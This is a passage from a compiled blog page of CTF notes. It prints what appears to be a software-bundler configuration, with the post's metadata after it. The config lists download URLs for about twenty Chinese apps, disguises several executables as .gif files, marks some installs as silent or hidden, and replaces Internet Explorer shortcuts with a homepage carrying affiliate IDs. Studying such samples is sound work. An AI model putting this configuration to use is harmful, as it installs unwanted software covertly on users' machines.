<span class="line"><span>S_2=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\KuaiZip</span></span>
<span class="line"><span>Y_2=0</span></span>
<span class="line"><span>L_2=0</span></span>
<span class="line"><span>M_2=</span></span>
<span class="line"><span>X_2=</span></span>
<span class="line"><span>FN_2=</span></span>
<span class="line"><span>FU_2=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_3=QQ............</span></span>
<span class="line"><span>Z_3=140</span></span>
<span class="line"><span>O_3=1</span></span>
<span class="line"><span>D_3=..............</span></span>
<span class="line"><span>I_3=http://down.shg20.com/shichangbu/ico/qqbrowser.ico</span></span>
<span class="line"><span>U_3=http://misc.wcd.qq.com/app?packageName=pcqqbrowser&amp;channelId=87698</span></span>
<span class="line"><span>F_3=V9._87698_20161028150508.exe</span></span>
<span class="line"><span>P_3=</span></span>
<span class="line"><span>C_3=2</span></span>
<span class="line"><span>R_3=2</span></span>
<span class="line"><span>S_3=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\QQBrowser.exe</span></span>
<span class="line"><span>V_3=path</span></span>
<span class="line"><span>Y_3=0</span></span>
<span class="line"><span>L_3=0</span></span>
<span class="line"><span>M_3=</span></span>
<span class="line"><span>X_3=QQ......</span></span>
<span class="line"><span>FN_3=</span></span>
<span class="line"><span>FU_3=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_4=............</span></span>
<span class="line"><span>Z_4=46</span></span>
<span class="line"><span>O_4=1</span></span>
<span class="line"><span>D_4=............</span></span>
<span class="line"><span>I_4=http://down.shg20.com/shichangbu/ico/aqrj.ico</span></span>
<span class="line"><span>U_4=http://dl.360safe.com/p/Setup_oemyinsu5.exe</span></span>
<span class="line"><span>F_4=Setup_oemyinsu5.exe</span></span>
<span class="line"><span>P_4=</span></span>
<span class="line"><span>C_4=2</span></span>
<span class="line"><span>R_4=2</span></span>
<span class="line"><span>S_4=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\360........</span></span>
<span class="line"><span>V_4=UninstallString</span></span>
<span class="line"><span>Y_4=0</span></span>
<span class="line"><span>L_4=2</span></span>
<span class="line"><span>M_4=</span></span>
<span class="line"><span>X_4=</span></span>
<span class="line"><span>FN_4=</span></span>
<span class="line"><span>FU_4=</span></span>
<span class="line"><span>N_5=......</span></span>
<span class="line"><span>Z_5=104</span></span>
<span class="line"><span>O_5=1</span></span>
<span class="line"><span>D_5=............</span></span>
<span class="line"><span>I_5=http://xiazai.xiazai2.net/ico/pps.ico</span></span>
<span class="line"><span>U_5=http://dl.static.iqiyi.com/hz/IQIYIsetup_gaoxin@kb004.exe</span></span>
<span class="line"><span>F_5=IQIYIsetup_gaoxin@kb004.exe</span></span>
<span class="line"><span>P_5=</span></span>
<span class="line"><span>C_5=1</span></span>
<span class="line"><span>R_5=2</span></span>
<span class="line"><span>S_5=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\PPStream</span></span>
<span class="line"><span>Y_5=0</span></span>
<span class="line"><span>L_5=0</span></span>
<span class="line"><span>X_5=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_6=2345......</span></span>
<span class="line"><span>Z_6=284</span></span>
<span class="line"><span>O_6=1</span></span>
<span class="line"><span>D_6=..........</span></span>
<span class="line"><span>I_6=http://down.shg20.com/shichangbu/ico/2345Explorer.ico</span></span>
<span class="line"><span>U_6=http://download.2345.com/union_common/2345explorer_39244138011_Y_silence.exe</span></span>
<span class="line"><span>F_6=2345explorer_39244138011_Y_silence.exe</span></span>
<span class="line"><span>P_6=</span></span>
<span class="line"><span>C_6=2</span></span>
<span class="line"><span>R_6=2</span></span>
<span class="line"><span>S_6=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\2345Explorer</span></span>
<span class="line"><span>V_6=UninstallString</span></span>
<span class="line"><span>Y_6=0</span></span>
<span class="line"><span>L_6=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_7=........</span></span>
<span class="line"><span>Z_7=294</span></span>
<span class="line"><span>O_7=1</span></span>
<span class="line"><span>D_7=............</span></span>
<span class="line"><span>I_7=http://down.shg20.com/shichangbu/ico/qqlive.ico</span></span>
<span class="line"><span>U_7=http://down.shg20.com/shichangbu/QQliveSetup_30_241.gif</span></span>
<span class="line"><span>F_7=QQliveSetup_30_241.exe</span></span>
<span class="line"><span>P_7=</span></span>
<span class="line"><span>C_7=2</span></span>
<span class="line"><span>R_7=2</span></span>
<span class="line"><span>S_7=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\qqlive</span></span>
<span class="line"><span>V_7=UninstallString</span></span>
<span class="line"><span>Y_7=0</span></span>
<span class="line"><span>L_7=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_8=......</span></span>
<span class="line"><span>Z_8=227</span></span>
<span class="line"><span>O_8=1</span></span>
<span class="line"><span>D_8=............</span></span>
<span class="line"><span>I_8=http://down.shg20.com/shichangbu/ico/ludashi.ico</span></span>
<span class="line"><span>U_8=http://dl.360safe.com/ludashi/inst_newspread.exe</span></span>
<span class="line"><span>F_8=inst_newspread.exe</span></span>
<span class="line"><span>P_8=</span></span>
<span class="line"><span>C_8=2</span></span>
<span class="line"><span>R_8=2</span></span>
<span class="line"><span>S_8=SOFTWARE\\LuDaShi</span></span>
<span class="line"><span>V_8=Setup Path</span></span>
<span class="line"><span>Y_8=0</span></span>
<span class="line"><span>L_8=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_9=..........</span></span>
<span class="line"><span>Z_9=231</span></span>
<span class="line"><span>O_9=1</span></span>
<span class="line"><span>D_9=..........</span></span>
<span class="line"><span>I_9=http://down.shg20.com/shichangbu/ico/xiaohei.ico</span></span>
<span class="line"><span>U_9=http://d.heinote.com/downloads/gaoxin/HNInstall_Setup_2207846935_gaoxin_001.exe</span></span>
<span class="line"><span>F_9=HNInstall_Setup_2207846935_gaoxin_001.exe</span></span>
<span class="line"><span>P_9=</span></span>
<span class="line"><span>C_9=2</span></span>
<span class="line"><span>R_9=2</span></span>
<span class="line"><span>S_9=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Heinote</span></span>
<span class="line"><span>V_9=UninstallString</span></span>
<span class="line"><span>Y_9=0</span></span>
<span class="line"><span>L_9=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_10=........</span></span>
<span class="line"><span>Z_10=269</span></span>
<span class="line"><span>O_10=1</span></span>
<span class="line"><span>D_10=............</span></span>
<span class="line"><span>I_10=http://down.shg20.com/shichangbu/ico/youxun.ico</span></span>
<span class="line"><span>U_10=http://nkme.ddlives.com/YouXiHe/ydtg.exe</span></span>
<span class="line"><span>F_10=ydtg.exe</span></span>
<span class="line"><span>P_10=hide</span></span>
<span class="line"><span>C_10=2</span></span>
<span class="line"><span>R_10=1</span></span>
<span class="line"><span>S_10=Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\leyoubox</span></span>
<span class="line"><span>V_10=UninstallString</span></span>
<span class="line"><span>Y_10=0</span></span>
<span class="line"><span>L_10=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_11=........</span></span>
<span class="line"><span>Z_11=252</span></span>
<span class="line"><span>O_11=1</span></span>
<span class="line"><span>D_11=..............</span></span>
<span class="line"><span>I_11=http://down.shg20.com/shichangbu/ico/huayzb.ico</span></span>
<span class="line"><span>U_11=http://dldir1.qq.com/huayang/HuaYangSetup_50059noui.exe</span></span>
<span class="line"><span>F_11=HuaYangSetup_50059noui.exe</span></span>
<span class="line"><span>P_11=</span></span>
<span class="line"><span>C_11=2</span></span>
<span class="line"><span>R_11=1</span></span>
<span class="line"><span>S_11=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\........</span></span>
<span class="line"><span>V_11=UninstallString</span></span>
<span class="line"><span>Y_11=0</span></span>
<span class="line"><span>L_11=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_12=..........</span></span>
<span class="line"><span>Z_12=217</span></span>
<span class="line"><span>O_12=1</span></span>
<span class="line"><span>D_12=............</span></span>
<span class="line"><span>I_12=http://down.shg20.com/shichangbu/ico/wnktw.ico</span></span>
<span class="line"><span>U_12=http://down.shg20.com/shichangbu/setup_wnktlxnb003.gif</span></span>
<span class="line"><span>F_12=setup_wnktlxnb003.exe</span></span>
<span class="line"><span>P_12=</span></span>
<span class="line"><span>C_12=2</span></span>
<span class="line"><span>R_12=2</span></span>
<span class="line"><span>S_12=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\..........</span></span>
<span class="line"><span>V_12=UninstallString</span></span>
<span class="line"><span>Y_12=0</span></span>
<span class="line"><span>L_12=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_13=Clover</span></span>
<span class="line"><span>Z_13=264</span></span>
<span class="line"><span>O_13=1</span></span>
<span class="line"><span>D_13=..............</span></span>
<span class="line"><span>I_13=http://down.shg20.com/shichangbu/ico/Clover.ico</span></span>
<span class="line"><span>U_13=http://down.shg20.com/shichangbu/setup_clvlxnb002.gif</span></span>
<span class="line"><span>F_13=setup_clvlxnb002.exe</span></span>
<span class="line"><span>P_13=/S</span></span>
<span class="line"><span>C_13=2</span></span>
<span class="line"><span>R_13=2</span></span>
<span class="line"><span>S_13=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Clover</span></span>
<span class="line"><span>V_13=UninstallString</span></span>
<span class="line"><span>Y_13=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>L_13=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_14=........</span></span>
<span class="line"><span>Z_14=278</span></span>
<span class="line"><span>O_14=1</span></span>
<span class="line"><span>D_14=............</span></span>
<span class="line"><span>I_14=http://down.shg20.com/shichangbu/ico/fengxbfq.ico</span></span>
<span class="line"><span>U_14=http://down.shg20.com/shichangbu/FunVPlayerInstall_PS_0108201.gif</span></span>
<span class="line"><span>F_14=FunVPlayerInstall_PS_0108201.exe</span></span>
<span class="line"><span>P_14=</span></span>
<span class="line"><span>C_14=2</span></span>
<span class="line"><span>R_14=2</span></span>
<span class="line"><span>S_14=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\..........</span></span>
<span class="line"><span>V_14=UninstallString</span></span>
<span class="line"><span>Y_14=0</span></span>
<span class="line"><span>L_14=0</span></span>
<span class="line"><span>E_14=app278</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_15=........</span></span>
<span class="line"><span>Z_15=287</span></span>
<span class="line"><span>O_15=1</span></span>
<span class="line"><span>D_15=..............</span></span>
<span class="line"><span>I_15=http://down.shg20.com/shichangbu/ico/koowo.ico</span></span>
<span class="line"><span>U_15=http://down.kuwo.cn/mbox/kuwo_jm795.exe</span></span>
<span class="line"><span>F_15=kuwo_jm795.exe</span></span>
<span class="line"><span>P_15=</span></span>
<span class="line"><span>C_15=2</span></span>
<span class="line"><span>R_15=2</span></span>
<span class="line"><span>S_15=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\KwMusic7</span></span>
<span class="line"><span>V_15=UninstallString</span></span>
<span class="line"><span>Y_15=0</span></span>
<span class="line"><span>L_15=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_16=2345......</span></span>
<span class="line"><span>Z_16=192</span></span>
<span class="line"><span>O_16=1</span></span>
<span class="line"><span>D_16=........</span></span>
<span class="line"><span>I_16=http://down.shg20.com/sc/ico/2345pic.ico</span></span>
<span class="line"><span>U_16=http://down.shg20.com/shichangbu/2345pic_lm_509762_v8.0.1.8020_silent.gif</span></span>
<span class="line"><span>F_16=2345pic_lm_509762_v8.0.1.8020_silent.exe</span></span>
<span class="line"><span>P_16=</span></span>
<span class="line"><span>C_16=2</span></span>
<span class="line"><span>R_16=2</span></span>
<span class="line"><span>S_16=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\2345Pic</span></span>
<span class="line"><span>V_16=UninstallString</span></span>
<span class="line"><span>Y_16=0</span></span>
<span class="line"><span>L_16=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_17=WPS</span></span>
<span class="line"><span>Z_17=157</span></span>
<span class="line"><span>O_17=1</span></span>
<span class="line"><span>D_17=............</span></span>
<span class="line"><span>I_17=http://down.shg20.com/shichangbu/ico/wps.ico</span></span>
<span class="line"><span>U_17=http://wdl1.cache.wps.cn/wps/download/W.P.S.6135.20.2498.exe</span></span>
<span class="line"><span>F_17=W.P.S.6135.20.2498.exe</span></span>
<span class="line"><span>P_17=</span></span>
<span class="line"><span>C_17=2</span></span>
<span class="line"><span>R_17=1</span></span>
<span class="line"><span>S_17=Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Kingsoft Office</span></span>
<span class="line"><span>V_17=UninstallString</span></span>
<span class="line"><span>Y_17=0</span></span>
<span class="line"><span>L_17=0</span></span>
<span class="line"><span>M_17=</span></span>
<span class="line"><span>X_17=1</span></span>
<span class="line"><span>FN_17=</span></span>
<span class="line"><span>FU_17=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_18=PPTV</span></span>
<span class="line"><span>Z_18=221</span></span>
<span class="line"><span>O_18=1</span></span>
<span class="line"><span>D_18=............</span></span>
<span class="line"><span>I_18=http://down.shg20.com/shichangbu/ico/pptv.ico</span></span>
<span class="line"><span>U_18=http://download.pplive.com/PPTV_forqd3407_4030023.exe</span></span>
<span class="line"><span>F_18=PPTV_forqd3407_4030023.exe</span></span>
<span class="line"><span>P_18=</span></span>
<span class="line"><span>C_18=2</span></span>
<span class="line"><span>R_18=2</span></span>
<span class="line"><span>S_18=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\PPLive</span></span>
<span class="line"><span>V_18=UninstallString</span></span>
<span class="line"><span>Y_18=0</span></span>
<span class="line"><span>L_18=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_19=91........</span></span>
<span class="line"><span>Z_19=209</span></span>
<span class="line"><span>O_19=1</span></span>
<span class="line"><span>D_19=..............</span></span>
<span class="line"><span>I_19=http://down.shg20.com/shichangbu/ico/91ygame.ico</span></span>
<span class="line"><span>U_19=http://down.shg20.com/shichangbu/91yGame-75.gif</span></span>
<span class="line"><span>F_19=91yGame-75.exe</span></span>
<span class="line"><span>P_19=</span></span>
<span class="line"><span>C_19=2</span></span>
<span class="line"><span>R_19=2</span></span>
<span class="line"><span>S_19=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\91yGame_is1</span></span>
<span class="line"><span>V_19=UninstallString</span></span>
<span class="line"><span>Y_19=0</span></span>
<span class="line"><span>L_19=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_20=........</span></span>
<span class="line"><span>Z_20=202</span></span>
<span class="line"><span>O_20=1</span></span>
<span class="line"><span>D_20=............</span></span>
<span class="line"><span>I_20=http://down.shg20.com/shichangbu/ico/kugou.ico</span></span>
<span class="line"><span>U_20=http://xiazai.kugou.com/Corp/kugou7_3632.exe</span></span>
<span class="line"><span>F_20=kugou7_3632.exe</span></span>
<span class="line"><span>P_20=</span></span>
<span class="line"><span>C_20=2</span></span>
<span class="line"><span>R_20=2</span></span>
<span class="line"><span>S_20=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\........</span></span>
<span class="line"><span>V_20=UninstallString</span></span>
<span class="line"><span>Y_20=0</span></span>
<span class="line"><span>L_20=0</span></span>
<span class="line"><span></span></span>
<span class="line"><span>N_21=......</span></span>
<span class="line"><span>Z_21=240</span></span>
<span class="line"><span>O_21=1</span></span>
<span class="line"><span>D_21=........</span></span>
<span class="line"><span>I_21=http://down.shg20.com/shichangbu/ico/Dandelion.ico</span></span>
<span class="line"><span>U_21=http://down.shg20.com/shichangbu/xyb/Dandelion.gif</span></span>
<span class="line"><span>F_21=Dandelion.zip</span></span>
<span class="line"><span>P_21=</span></span>
<span class="line"><span>C_21=0</span></span>
<span class="line"><span>Y_21=0</span></span>
<span class="line"><span>L_21=1</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>[unlnk1]</span></span>
<span class="line"><span>N_0=15</span></span>
<span class="line"><span>N_1=&quot;Internet H&quot;</span></span>
<span class="line"><span>N_2=&quot;Internet  &quot;</span></span>
<span class="line"><span>N_3=&quot;Internet Expd&quot;</span></span>
<span class="line"><span>N_4=&quot;Internet Explorert&quot;</span></span>
<span class="line"><span>N_5=&quot;Internet D&quot;</span></span>
<span class="line"><span>N_6=&quot;Internet .&quot;</span></span>
<span class="line"><span>N_7=&quot;1nternet H&quot;</span></span>
<span class="line"><span>N_8=&quot;1nternet  &quot;</span></span>
<span class="line"><span>N_9=&quot;1nternet Expd&quot;</span></span>
<span class="line"><span>N_10=&quot;1nternet Explorert&quot;</span></span>
<span class="line"><span>N_11=&quot;1nternet D&quot;</span></span>
<span class="line"><span>N_12=&quot;1nternet .&quot;</span></span>
<span class="line"><span>N_13=&quot;Internet Explorers&quot;</span></span>
<span class="line"><span>N_14=&quot;Internet K&quot;</span></span>
<span class="line"><span>N_15=&quot;Internet Expu&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[unlnk2]</span></span>
<span class="line"><span>N_0=15</span></span>
<span class="line"><span>N_1=&quot;Internet H&quot;</span></span>
<span class="line"><span>N_2=&quot;Internet  &quot;</span></span>
<span class="line"><span>N_3=&quot;Internet Expd&quot;</span></span>
<span class="line"><span>N_4=&quot;Internet Explorert&quot;</span></span>
<span class="line"><span>N_5=&quot;Internet D&quot;</span></span>
<span class="line"><span>N_6=&quot;Internet .&quot;</span></span>
<span class="line"><span>N_7=&quot;1nternet H&quot;</span></span>
<span class="line"><span>N_8=&quot;1nternet  &quot;</span></span>
<span class="line"><span>N_9=&quot;1nternet Expd&quot;</span></span>
<span class="line"><span>N_10=&quot;1nternet Explorert&quot;</span></span>
<span class="line"><span>N_11=&quot;1nternet D&quot;</span></span>
<span class="line"><span>N_12=&quot;1nternet .&quot;</span></span>
<span class="line"><span>N_13=&quot;Internet Explorers&quot;</span></span>
<span class="line"><span>N_14=&quot;Internet K&quot;</span></span>
<span class="line"><span>N_15=&quot;Internet Expu&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[unlnk3]</span></span>
<span class="line"><span>N_0=5</span></span>
<span class="line"><span>N_1=hao123..</span></span>
<span class="line"><span>N_2=........</span></span>
<span class="line"><span>N_3=........</span></span>
<span class="line"><span>N_4=........</span></span>
<span class="line"><span>N_5=Internet</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[inlnk2]</span></span>
<span class="line"><span>N_1=1</span></span>
<span class="line"><span>N_11=&quot;........&quot;</span></span>
<span class="line"><span>I_11=http://down.shg20.com/shichangbu2/icon.ico</span></span>
<span class="line"><span>H_11=http://hao.360.cn/?src=lm&amp;ls=n1e6b736897</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[dir]</span></span>
<span class="line"><span>N_1=................</span></span>
<span class="line"><span>H_1=http://hao.360.cn/?src=lm&amp;ls=n1e6b736897</span></span>
<span class="line"><span>Ver=6.0.0.2</span></span>
<span class="line"><span>GX=0</span></span>
<span class="line"><span>PDH_1=2</span></span>
<span class="line"><span>BSC_1=0</span></span>
<span class="line"><span>LNKTP=1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[gen]</span></span>
<span class="line"><span>XLSIZE=10485760</span></span>
<span class="line"><span>X_TYPE=0</span></span>
<span class="line"><span>QHCID=3112155</span></span>
<span class="line"><span>QHHP=n2bb4457f9c</span></span>
<span class="line"><span>PORT=6100</span></span>
<span class="line"><span>YCSC=0</span></span>
<span class="line"><span>YCHP=0</span></span>
<span class="line"><span>XICO=0</span></span>
<span class="line"><span>UIID=0</span></span>
<span class="line"><span>QYHP=1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[app230]</span></span>
<span class="line"><span>C_1=1</span></span>
<span class="line"><span>R_1=2</span></span>
<span class="line"><span>S_1=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\............</span></span>
<span class="line"><span>V_1=</span></span>
<span class="line"><span>C_2=1</span></span>
<span class="line"><span>R_2=2</span></span>
<span class="line"><span>S_2=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\................</span></span>
<span class="line"><span>V_2=</span></span>
<span class="line"><span>C_3=1</span></span>
<span class="line"><span>R_3=2</span></span>
<span class="line"><span>S_3=SOFTWARE\\SmartCloudInput</span></span>
<span class="line"><span>V_3=</span></span>
<span class="line"><span>C_4=1</span></span>
<span class="line"><span>R_4=2</span></span>
<span class="line"><span>S_4=SOFTWARE\\SmartCloudWBInput</span></span>
<span class="line"><span>V_4=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[app278]</span></span>
<span class="line"><span>C_1=1</span></span>
<span class="line"><span>R_1=2</span></span>
<span class="line"><span>S_1=SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FunAccelerator</span></span>
<span class="line"><span>V_1=</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[mark]</span></span>
<span class="line"><span>key=D6F776F6F17052CE8B6D4FC861D68994</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div>`,79)]))}const o=n(l,[["render",e]]),r=JSON.parse('{"path":"/posts/2017-10-24-ctf.html","title":"玩玩CTF","lang":"zh-CN","frontmatter":{"title":"玩玩CTF","date":"2017-10-24T00:00:00.000Z","category":["CTF","安全","渗透测试"],"tag":["aaencode","base64","zip","UltraEdit","strings","quipqiup","词频分析"],"description":"Xp0int大家庭 Xp0int日常，跑一下我们在干什么？ 网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag 弗拉戈在哪里？ 小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？ 提示： 在zip里面 1.zip 拖进UltraEdit 搜索flag 发现一段base64，于是解码。应该...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"玩玩CTF\\",\\"image\\":[\\"http://7xkmnm.com1.z0.glb.clouddn.com/%E6%88%AA%E5%9B%BE1.PNG\\",\\"http://7xkmnm.com1.z0.glb.clouddn.com/xls1.PNG\\",\\"http://7xkmnm.com1.z0.glb.clouddn.com/xls2.PNG\\"],\\"datePublished\\":\\"2017-10-24T00:00:00.000Z\\",\\"dateModified\\":\\"2024-09-29T15:21:40.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Guohao\\",\\"url\\":\\"https://space.vistazx1.top\\"}]}"],["meta",{"property":"og:url","content":"https://space.vistazx1.top/posts/2017-10-24-ctf.html"}],["meta",{"property":"og:site_name","content":"Vista"}],["meta",{"property":"og:title","content":"玩玩CTF"}],["meta",{"property":"og:description","content":"Xp0int大家庭 Xp0int日常，跑一下我们在干什么？ 网上搜索发现是 aaencode 所以试试在chrome的console运行。 得到flag 弗拉戈在哪里？ 小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？ 提示： 在zip里面 1.zip 拖进UltraEdit 搜索flag 发现一段base64，于是解码。应该..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://7xkmnm.com1.z0.glb.clouddn.com/%E6%88%AA%E5%9B%BE1.PNG"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-09-29T15:21:40.000Z"}],["meta",{"property":"article:tag","content":"词频分析"}],["meta",{"property":"article:tag","content":"quipqiup"}],["meta",{"property":"article:tag","content":"strings"}],["meta",{"property":"article:tag","content":"UltraEdit"}],["meta",{"property":"article:tag","content":"zip"}],["meta",{"property":"article:tag","content":"base64"}],["meta",{"property":"article:tag","content":"aaencode"}],["meta",{"property":"article:published_time","content":"2017-10-24T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-09-29T15:21:40.000Z"}]]},"git":{"createdTime":1727623300000,"updatedTime":1727623300000,"contributors":[{"name":"root","username":"root","email":"root@vistazx1.top","commits":1,"url":"https://github.com/root"}]},"readingTime":{"minutes":10.06,"words":3019},"filePathRelative":"posts/2017-10-24-ctf.md","excerpt":"\\n<blockquote>\\n<p>Xp0int日常，跑一下我们在干什么？</p>\\n</blockquote>\\n<p>网上搜索发现是\\naaencode\\n所以试试在chrome的console运行。\\n得到flag</p>\\n<h1>弗拉戈在哪里？</h1>\\n<blockquote>\\n<p>小明整蛊舍友，将他舍友的兰博基尼钥匙锁在zip里面了，你能帮他找回钥匙吗？</p>\\n</blockquote>\\n<p>提示： 在zip里面</p>\\n<p>1.zip 拖进UltraEdit 搜索flag<br>\\n发现一段base64，于是解码。应该也能用strings命令看到base64。</p>\\n<h1>好像说太多了</h1>","autoDesc":true}');export{o as comp,r as data};
